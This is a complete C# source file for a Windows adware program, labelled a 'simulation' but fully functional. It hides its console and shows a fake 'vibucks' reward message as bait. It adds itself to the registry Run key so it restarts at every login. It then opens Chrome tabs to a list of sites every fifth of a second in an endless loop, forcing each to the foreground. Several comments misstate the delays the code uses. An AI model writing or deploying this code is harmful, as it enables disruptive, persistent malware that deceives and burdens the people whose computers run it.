using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using Microsoft.Win32;

namespace AdwareSimulation
{
    class Program
    {
        // Import necessary function from user32.dll to bring window to front
        [DllImport("user32.dll")]
        private static extern bool SetForegroundWindow(IntPtr hWnd);

        // List of URLs to be opened (these could be ad links)
        private static readonly string[] adUrls = new string[]
        {
            "https://parade.com/1116816/marynliles/fun-websites/",
            "https://www.google.com",
            "https://www.youtube.com",
            "http://papertoilet.com/" ,
            "https://www.nytimes.com/games/wordle/index.html",
            "https://archive.org/web/",
            "https://play2048.co/",
            "https://www.pinterest.com/",
            "https://github.com/",
            "https://www.reddit.com/",


        };

        // Import user32.dll to minimize the console window
        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        private const int SW_MINIMIZE = 6;

        static async Task Main(string[] args)
        {
            // Minimize the console window
            IntPtr hWnd = GetForegroundWindow();
            ShowWindow(hWnd, SW_MINIMIZE);

            Console.WriteLine("vibucks started to add to your account");

            // Add the application to startup
            AddApplicationToStartup();

            // Simulate adware behavior in a loop
            while (true)
            {
                await Task.Delay(TimeSpan.FromSeconds(0.2)); // Wait for 1 minute
                await ShowAds();
            }
        }

        static async Task ShowAds()
        {
            foreach (var adUrl in adUrls)
            {
                try
                {
                    string chromePath = @"C:\Program Files\Google\Chrome\Application\chrome.exe";
                    Console.WriteLine("Trying to start process with file path: " + chromePath);

                    if (File.Exists(chromePath))
                    {
                        var processStartInfo = new ProcessStartInfo
                        {
                            FileName = chromePath,
                            Arguments = adUrl,
                            UseShellExecute = true
                        };

                        Process process = Process.Start(processStartInfo);

                        // Bring the browser window to the front
                        await Task.Delay(500); // Slight delay to ensure the process starts
                        if (process.MainWindowHandle != IntPtr.Zero)
                        {
                            SetForegroundWindow(process.MainWindowHandle);
                        }

                        Console.WriteLine("Ad displayed: " + adUrl);
                    }
                    else
                    {
                        Console.WriteLine("The file specified does not exist: " + chromePath);
                    }
                }
                catch (Win32Exception ex)
                {
                    Console.WriteLine("An error occurred while trying to start the process: " + ex.Message);
                }
                catch (Exception ex)
                {
                    Console.WriteLine("An unexpected error occurred: " + ex.Message);
                }

                await Task.Delay(TimeSpan.FromSeconds(0.2)); // Wait for 10 seconds before opening the next URL
            }
        }

        static void AddApplicationToStartup()
        {
            string appName = "AdwareSimulation";
            string appPath = Process.GetCurrentProcess().MainModule.FileName;

            try
            {
                RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                if (registryKey != null)
                {
                    registryKey.SetValue(appName, appPath);
                    registryKey.Close();
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("An error occurred while adding the application to startup: " + ex.Message);
            }
        }
    }
}
